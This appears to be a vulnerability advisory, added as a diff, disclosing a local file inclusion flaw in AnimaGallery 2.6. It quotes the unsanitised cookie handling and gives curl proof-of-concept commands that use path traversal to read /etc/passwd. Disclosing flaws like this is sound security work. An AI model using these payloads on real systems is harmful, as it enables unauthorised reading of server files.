@@ -1,0 +1,36 @@
+# Exploit Title: AnimaGallery 2.6 (theme and lang cookie parametre) Local File Include Vulnerability 
+# Date: 2015/06/07 
+# Vendor Homepage: http://dg.no.sapo.pt/ 
+# Software Link:http://dg.no.sapo.pt/AnimaGallery2.6.zip
+# Version: 2.6
+# Tested on: Centos 6.5,php 5.3.2,magic_quotes_gpc=off # Category: webapps
+
+* Description
+
+func.php
+line 21 - 22:
+
+include('themes/'.$THEME.'/templates.php');
+include('languages/'.$LANG.'.php');
+
+$lang and $THEME parametre from import_theme_lang() function.
+
+function import_theme_lang()
+{
+  $THEME = DEFAULT_THEME;
+  if(isset($_COOKIE['theme']) AND !THEME_LOCKED)
+    $THEME = $_COOKIE['theme'];  <--  Not Taint Checking
+
+  $LANG = DEFAULT_LANG;
+  if(isset($_COOKIE['lang']) AND @file_exists('languages/'.$_COOKIE['lang'].'.php') AND !LANG_LOCKED)
+    $LANG = $_COOKIE['lang'];     <--- Not Taint Checking
+
+  return(array($THEME, $LANG));
+}
+
+
+* Proof of Concept
+
+curl "http://192.168.1.101/AnimaGallery/?load=adminboard&mode=1" --cookie "lang=../../../../../../../etc/passwd%00"
+
+curl "http://192.168.1.101/AnimaGallery/?load=adminboard&mode=1" --cookie "theme=../../../../../../../etc/passwd%00"
